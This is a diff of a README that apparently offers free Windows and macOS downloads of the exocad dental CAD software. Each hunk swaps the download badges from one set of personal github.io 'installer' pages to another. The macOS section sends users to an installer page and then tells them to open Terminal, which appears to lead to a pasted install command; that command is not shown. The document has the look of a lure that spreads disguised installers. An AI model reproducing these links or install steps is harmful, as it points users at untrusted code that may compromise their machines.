@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
@@ -77,7 +77,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -109,7 +109,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -135,7 +135,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
